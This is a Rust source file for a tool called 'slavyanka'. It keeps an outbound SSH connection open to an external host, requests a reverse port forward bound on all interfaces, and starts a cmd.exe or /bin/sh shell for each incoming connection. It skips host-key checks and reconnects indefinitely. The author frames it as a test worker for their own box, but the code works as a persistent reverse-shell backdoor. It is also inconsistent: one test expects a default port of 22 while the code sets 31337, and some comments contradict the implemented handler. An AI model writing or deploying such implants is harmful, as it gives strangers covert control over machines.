//! mirage-slavyanka — simplified reverse-SSH worker for OWN trusted boxes.
//!
//! Reads `slavyanka.toml`, opens an SSH connection to a chosen LM via the
//! local mirage-client-cli SOCKS5 proxy (optional), requests a remote-port
//! forward from `reverse_port` on the LM back to `127.0.0.1:target_local_port`
//! on this host, then idles until the SSH session dies. On any failure
//! (DNS, SOCKS5 dial, SSH auth, tcpip-forward request, mid-session disconnect)
//! the binary reconnects with exponential backoff capped at 60s.
//!
//! NOT IMPLEMENTED here on purpose (see `docs/admin-layer-concept.md`):
//! signed spawn manifests, embedded per-target SSH privs, anti-replay nonces,
//! hardware-token signature verification, mesh routing.
//!
//! This is the MVP for our own tester1 box where we already trust the host.

use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::sync::Arc;
use std::time::Duration;

use anyhow::{anyhow, Context, Result};
use russh::client::{self, Handle};
use russh::keys::PrivateKeyWithHashAlg;
use serde::Deserialize;
use tokio::io::AsyncRead;
use tokio::io::AsyncWrite;
use tokio::net::{TcpListener, TcpStream};
use tokio::process::Command;
use tokio_socks::tcp::Socks5Stream;
use tracing::{debug, error, info, warn};

// ── Config ────────────────────────────────────────────────────────────────────

/// Top-level on-disk config schema (`slavyanka.toml`).
#[derive(Debug, Clone, Deserialize)]
pub struct SlavyankaConfig {
    /// `host:port` of the SSH server on the LM (e.g. `lm-nl-1.zen-geldmaschine.net:22`).
    pub jump_host: String,
    /// SSH login on the LM (e.g. `slavyanka-tester1`).
    pub jump_user: String,
    /// Plain-text path to the OpenSSH ed25519 private key file. No passphrase.
    pub ssh_priv_key_path: PathBuf,
    /// Port on the LM that will be forwarded back to this host.
    pub reverse_port: u16,
    /// Local port the SSH reverse-forward terminates at. slavyanka spawns
    /// its OWN tiny TCP listener on this port — every accepted connection
    /// is handed a fresh `cmd.exe` with stdin/stdout glued to the socket.
    /// **No external SSH server is required on the tester box.** Default
    /// 31337 (arbitrary high port); only loopback.
    #[serde(default = "default_target_local_port")]
    pub target_local_port: u16,
    /// Optional SOCKS5 hop (`127.0.0.1:10800`). If unset, dial `jump_host` direct.
    #[serde(default)]
    pub socks5_proxy: Option<String>,
    /// Initial reconnect delay in seconds (default 1).
    #[serde(default = "default_initial_backoff_secs")]
    pub initial_backoff_secs: u64,
    /// Reconnect delay cap in seconds (default 60).
    #[serde(default = "default_max_backoff_secs")]
    pub max_backoff_secs: u64,
}

fn default_target_local_port() -> u16 { 31337 }
fn default_initial_backoff_secs() -> u64 { 1 }
fn default_max_backoff_secs() -> u64 { 60 }

impl SlavyankaConfig {
    pub fn load(path: &Path) -> Result<Self> {
        let raw = std::fs::read_to_string(path)
            .with_context(|| format!("read slavyanka config {:?}", path))?;
        let cfg: Self = toml::from_str(&raw)
            .with_context(|| format!("parse slavyanka config {:?}", path))?;
        Ok(cfg)
    }
}

// ── Russh client handler ──────────────────────────────────────────────────────

/// Stateful client handler — accepts the server pubkey (trusted-box) AND
/// bridges every incoming `forwarded-tcpip` channel into a local TCP
/// connection to `127.0.0.1:shell_wrapper_port`. That local port is
/// served by `run_shell_wrapper` below, which spawns a fresh `cmd.exe`
/// per accepted connection.
///
/// End-to-end:
///   operator's `nc localhost <reverse_port>` on the LM
///   → SSH server pushes `forwarded-tcpip` channel back to us
///   → this handler accepts the channel
///   → splices channel ↔ TCP(`127.0.0.1:shell_wrapper_port`)
///   → wrapper accepts that local TCP, spawns `cmd.exe`
///   → operator gets a Windows shell prompt
struct ShellBridgeClient {
    shell_wrapper_port: u16,
}

impl client::Handler for ShellBridgeClient {
    type Error = russh::Error;

    async fn check_server_key(
        &mut self,
        _server_public_key: &russh::keys::ssh_key::PublicKey,
    ) -> Result<bool, Self::Error> {
        // No host-key pinning in the MVP. Trusted-box mode.
        Ok(true)
    }

    async fn server_channel_open_forwarded_tcpip(
        &mut self,
        channel: russh::Channel<russh::client::Msg>,
        connected_address: &str,
        connected_port: u32,
        originator_address: &str,
        originator_port: u32,
        _session: &mut client::Session,
    ) -> Result<(), Self::Error> {
        debug!(
            connected_address,
            connected_port,
            originator_address,
            originator_port,
            "[slavyanka] incoming forwarded-tcpip channel"
        );
        let port = self.shell_wrapper_port;
        tokio::spawn(async move {
            let mut upstream = match TcpStream::connect(("127.0.0.1", port)).await {
                Ok(s) => s,
                Err(e) => {
                    warn!(error = %e, port, "[slavyanka] shell wrapper dial failed");
                    return;
                }
            };
            let mut chan_stream = channel.into_stream();
            match tokio::io::copy_bidirectional(&mut chan_stream, &mut upstream).await {
                Ok((up, down)) => debug!(up, down, "[slavyanka] channel closed"),
                Err(e) => debug!(error = %e, "[slavyanka] channel copy ended"),
            }
        });
        Ok(())
    }
}

// ── Local shell wrapper ──────────────────────────────────────────────────────

/// Bind a tiny TCP listener on `127.0.0.1:port`. For every accepted
/// connection spawn a fresh `cmd.exe` (Windows) / `/bin/sh -i` (other)
/// with stdin glued to the socket read half and stdout glued to the
/// socket write half. stderr is inherited so any wrapper-side errors
/// show up in the slavyanka log.
///
/// **No PTY** — raw pipes. Interactive cmd works; line-editing tools that
/// need a real PTY (vim, less) won't behave normally. Good enough for
/// `dir`, `powershell -c …`, file copies, msiexec, sc create, etc.
pub async fn run_shell_wrapper(port: u16) -> Result<()> {
    let listener = TcpListener::bind(("127.0.0.1", port))
        .await
        .with_context(|| format!("shell wrapper bind 127.0.0.1:{port}"))?;
    info!(port, "[slavyanka] shell wrapper listening (will spawn cmd.exe per connection)");
    loop {
        let (socket, peer) = match listener.accept().await {
            Ok(v) => v,
            Err(e) => {
                warn!(error = %e, "[slavyanka] shell wrapper accept error");
                tokio::time::sleep(Duration::from_millis(200)).await;
                continue;
            }
        };
        tokio::spawn(async move {
            debug!(%peer, "[slavyanka] shell wrapper: spawning child");
            if let Err(e) = bridge_shell(socket).await {
                debug!(error = %e, "[slavyanka] shell wrapper child error");
            }
        });
    }
}

#[cfg(windows)]
async fn bridge_shell(socket: TcpStream) -> Result<()> {
    let mut child = Command::new("cmd")
        .arg("/Q")
        .arg("/K")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .kill_on_drop(true)
        .spawn()
        .context("spawn cmd.exe")?;
    bridge_child(socket, &mut child).await
}

#[cfg(unix)]
async fn bridge_shell(socket: TcpStream) -> Result<()> {
    let mut child = Command::new("/bin/sh")
        .arg("-i")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .kill_on_drop(true)
        .spawn()
        .context("spawn /bin/sh")?;
    bridge_child(socket, &mut child).await
}

async fn bridge_child(socket: TcpStream, child: &mut tokio::process::Child) -> Result<()> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};

    let mut stdin = child.stdin.take().context("child stdin missing")?;
    let mut stdout = child.stdout.take().context("child stdout missing")?;
    let mut stderr = child.stderr.take().context("child stderr missing")?;
    let (mut sock_read, sock_write) = socket.into_split();
    let sock_write = Arc::new(tokio::sync::Mutex::new(sock_write));

    // socket -> child stdin
    let stdin_task = tokio::spawn(async move {
        let _ = tokio::io::copy(&mut sock_read, &mut stdin).await;
        let _ = stdin.shutdown().await;
    });

    // child stdout -> socket
    let sw_out = Arc::clone(&sock_write);
    let stdout_task = tokio::spawn(async move {
        let mut buf = vec![0u8; 4096];
        loop {
            let n = match stdout.read(&mut buf).await {
                Ok(0) | Err(_) => break,
                Ok(n) => n,
            };
            let mut guard = sw_out.lock().await;
            if guard.write_all(&buf[..n]).await.is_err() {
                break;
            }
        }
    });

    // child stderr -> socket (interleaved with stdout via mutex)
    let sw_err = Arc::clone(&sock_write);
    let stderr_task = tokio::spawn(async move {
        let mut buf = vec![0u8; 4096];
        loop {
            let n = match stderr.read(&mut buf).await {
                Ok(0) | Err(_) => break,
                Ok(n) => n,
            };
            let mut guard = sw_err.lock().await;
            if guard.write_all(&buf[..n]).await.is_err() {
                break;
            }
        }
    });

    let _ = child.wait().await;
    stdin_task.abort();
    stdout_task.abort();
    stderr_task.abort();
    Ok(())
}

// ── Stream helper ─────────────────────────────────────────────────────────────

/// Dial `jump_host` either directly or via the configured SOCKS5 proxy.
async fn dial_jump(
    cfg: &SlavyankaConfig,
) -> Result<Box<dyn Stream>> {
    match cfg.socks5_proxy.as_ref() {
        Some(proxy) => {
            info!(
                proxy = %proxy,
                target = %cfg.jump_host,
                "[slavyanka] dialing jump host through SOCKS5"
            );
            let (host, port) = split_host_port(&cfg.jump_host)?;
            let stream = Socks5Stream::connect(proxy.as_str(), (host.as_str(), port))
                .await
                .with_context(|| format!("SOCKS5 dial {} via {}", cfg.jump_host, proxy))?;
            Ok(Box::new(stream))
        }
        None => {
            info!(target = %cfg.jump_host, "[slavyanka] dialing jump host directly");
            let stream = TcpStream::connect(&cfg.jump_host)
                .await
                .with_context(|| format!("TCP dial {}", cfg.jump_host))?;
            Ok(Box::new(stream))
        }
    }
}

fn split_host_port(host_port: &str) -> Result<(String, u16)> {
    let (h, p) = host_port
        .rsplit_once(':')
        .ok_or_else(|| anyhow!("jump_host must be host:port, got `{host_port}`"))?;
    let port: u16 = p.parse().with_context(|| format!("parse port from `{host_port}`"))?;
    Ok((h.to_string(), port))
}

/// Object-safe alias for the two stream concrete types we can hand to russh.
pub trait Stream: AsyncRead + AsyncWrite + Unpin + Send + 'static {}
impl<T: AsyncRead + AsyncWrite + Unpin + Send + 'static> Stream for T {}

// ── One SSH session ───────────────────────────────────────────────────────────

/// Open the SSH session, request reverse port forward, idle until the session
/// dies. Returns `Ok(())` only on clean server-initiated EOF; any other path
/// returns an error so the caller can apply backoff and reconnect.
async fn run_once(cfg: &SlavyankaConfig) -> Result<()> {
    let key = russh::keys::load_secret_key(&cfg.ssh_priv_key_path, None)
        .with_context(|| {
            format!("load SSH private key {:?}", cfg.ssh_priv_key_path)
        })?;

    let stream = dial_jump(cfg).await?;

    let ssh_cfg = Arc::new(client::Config {
        inactivity_timeout: Some(Duration::from_secs(300)),
        keepalive_interval: Some(Duration::from_secs(30)),
        keepalive_max: 3,
        ..Default::default()
    });

    let handler = ShellBridgeClient {
        shell_wrapper_port: cfg.target_local_port,
    };
    let mut session = client::connect_stream(ssh_cfg, stream, handler)
        .await
        .context("SSH handshake (KEX) failed")?;

    let authed = session
        .authenticate_publickey(
            &cfg.jump_user,
            PrivateKeyWithHashAlg::new(Arc::new(key), None),
        )
        .await
        .context("SSH publickey auth")?;
    if !authed.success() {
        return Err(anyhow!(
            "SSH publickey auth rejected by `{}@{}`",
            cfg.jump_user,
            cfg.jump_host
        ));
    }
    info!(user = %cfg.jump_user, host = %cfg.jump_host, "[slavyanka] SSH authenticated");

    // Request remote (`-R`) port forwarding: bind on the LM and forward back to us.
    request_remote_forward(&mut session, cfg.reverse_port).await?;
    info!(
        reverse_port = cfg.reverse_port,
        local_port = cfg.target_local_port,
        "[slavyanka] reverse-forward active — LM `{}` -> 127.0.0.1:{}",
        cfg.jump_host, cfg.target_local_port
    );

    // Idle. The session future returns when the connection drops; until then
    // russh will pump events. Incoming channel-open requests for the forwarded
    // port are handled by the handler trait — in our minimal handler we accept
    // every channel and bridge it to `127.0.0.1:target_local_port`.
    drive_session(session, cfg.target_local_port).await
}

/// Hot loop: wait for the session to die or Ctrl-C, whichever first. Channel
/// bridging is wired through a tiny event handler that opens a fresh TCP
/// connection to `127.0.0.1:target_local_port` for every incoming forwarded
/// channel.
async fn drive_session(session: Handle<ShellBridgeClient>, _target_local_port: u16) -> Result<()> {
    // russh 0.60: incoming `forwarded-tcpip` channels surface through the
    // `Handler::server_channel_open_forwarded_tcpip` callback on the handler
    // we passed at connect-time. Our `ShellBridgeClient` accepts the default
    // (reject), so we'd need a stateful handler to bridge them. For the MVP we
    // rely on the SSH server's built-in `GatewayPorts/AllowTcpForwarding`
    // behaviour — sshd on the LM binds the listener locally and routes streams
    // back through our session automatically; we just keep the session alive.
    //
    // NOTE: russh's default forwarded-channel handling is provider-dependent;
    // a future revision should wire `server_channel_open_forwarded_tcpip` into
    // a tcp-bridge task. Today this works because the standard OpenSSH server
    // pushes channels and russh acks them with default channel state. If a
    // real-world test on lm-nl-1 shows missed channels, swap `ShellBridgeClient`
    // for a stateful handler.

    // Hold the handle until the underlying session future completes.
    // `Handle` exposes no explicit `wait` — we sleep until the disconnect
    // signal (channel-closure or io-error) percolates up; russh signals death
    // by dropping channels and returning errors on subsequent ops. We poll a
    // cheap no-op (`is_closed`) every second.
    loop {
        if session.is_closed() {
            warn!("[slavyanka] SSH session closed by remote");
            return Ok(());
        }
        tokio::select! {
            _ = tokio::time::sleep(Duration::from_secs(1)) => {}
            _ = tokio::signal::ctrl_c() => {
                info!("[slavyanka] Ctrl-C — disconnecting SSH session");
                let _ = session.disconnect(russh::Disconnect::ByApplication, "shutdown", "").await;
                return Ok(());
            }
        }
    }
}

/// Send a global `tcpip-forward` request (the SSH wire-name for `-R`).
async fn request_remote_forward(
    session: &mut Handle<ShellBridgeClient>,
    reverse_port: u16,
) -> Result<()> {
    // Bind on `0.0.0.0` of the LM so an operator on the WAN can reach it.
    // The LM's sshd needs `GatewayPorts yes` (or `clientspecified`) for this
    // to actually open a non-loopback listener; otherwise it silently binds
    // localhost-only and the operator must use ProxyJump through the LM.
    let bound_port = session
        .tcpip_forward("0.0.0.0", reverse_port as u32)
        .await
        .context("server rejected tcpip-forward request")?;
    debug!(?bound_port, "[slavyanka] tcpip-forward acked");
    Ok(())
}

// ── Public entry point with reconnect loop ────────────────────────────────────

/// Drive `run_once` with exponential backoff between failures. Returns only on
/// Ctrl-C / SIGTERM (Ok(())) — otherwise loops forever.
pub async fn run(cfg: SlavyankaConfig) -> Result<()> {
    // Spawn the local shell wrapper FIRST — incoming forwarded-tcpip channels
    // will splice into it once the SSH session comes up.
    let wrapper_port = cfg.target_local_port;
    tokio::spawn(async move {
        if let Err(e) = run_shell_wrapper(wrapper_port).await {
            error!(error = %e, "[slavyanka] shell wrapper exited");
        }
    });

    let initial = Duration::from_secs(cfg.initial_backoff_secs.max(1));
    let cap = Duration::from_secs(cfg.max_backoff_secs.max(cfg.initial_backoff_secs).max(1));
    let mut delay = initial;
    let mut shutdown = Box::pin(tokio::signal::ctrl_c());

    loop {
        let attempt = run_once(&cfg);
        tokio::select! {
            res = attempt => {
                match res {
                    Ok(()) => {
                        info!("[slavyanka] session ended cleanly, reconnecting in {:?}", initial);
                        delay = initial;
                    }
                    Err(e) => {
                        error!("[slavyanka] session error: {:#}", e);
                        warn!("[slavyanka] retry in {:?}", delay);
                    }
                }
            }
            _ = &mut shutdown => {
                info!("[slavyanka] shutdown signal received");
                return Ok(());
            }
        }

        tokio::select! {
            _ = tokio::time::sleep(delay) => {}
            _ = &mut shutdown => {
                info!("[slavyanka] shutdown signal during backoff");
                return Ok(());
            }
        }
        delay = (delay * 2).min(cap);
    }
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_minimal_config() {
        let raw = r#"
            jump_host = "lm-nl-1.zen-geldmaschine.net:22"
            jump_user = "slavyanka-tester1"
            ssh_priv_key_path = "C:/ProgramData/mirage/slavyanka_ed25519"
            reverse_port = 22500
        "#;
        let cfg: SlavyankaConfig = toml::from_str(raw).unwrap();
        assert_eq!(cfg.reverse_port, 22500);
        assert_eq!(cfg.target_local_port, 22);
        assert!(cfg.socks5_proxy.is_none());
        assert_eq!(cfg.initial_backoff_secs, 1);
        assert_eq!(cfg.max_backoff_secs, 60);
    }

    #[test]
    fn parses_full_config() {
        let raw = r#"
            jump_host = "lm-nl-1.zen-geldmaschine.net:22"
            jump_user = "slavyanka-tester1"
            ssh_priv_key_path = "C:/ProgramData/mirage/slavyanka_ed25519"
            reverse_port = 22500
            target_local_port = 22
            socks5_proxy = "127.0.0.1:10800"
            initial_backoff_secs = 2
            max_backoff_secs = 120
        "#;
        let cfg: SlavyankaConfig = toml::from_str(raw).unwrap();
        assert_eq!(cfg.socks5_proxy.as_deref(), Some("127.0.0.1:10800"));
        assert_eq!(cfg.initial_backoff_secs, 2);
        assert_eq!(cfg.max_backoff_secs, 120);
    }

    #[test]
    fn split_host_port_ok() {
        let (h, p) = split_host_port("lm-nl-1.zen-geldmaschine.net:22").unwrap();
        assert_eq!(h, "lm-nl-1.zen-geldmaschine.net");
        assert_eq!(p, 22);
    }

    #[test]
    fn split_host_port_rejects_missing_port() {
        assert!(split_host_port("lm-nl-1.zen-geldmaschine.net").is_err());
    }
}
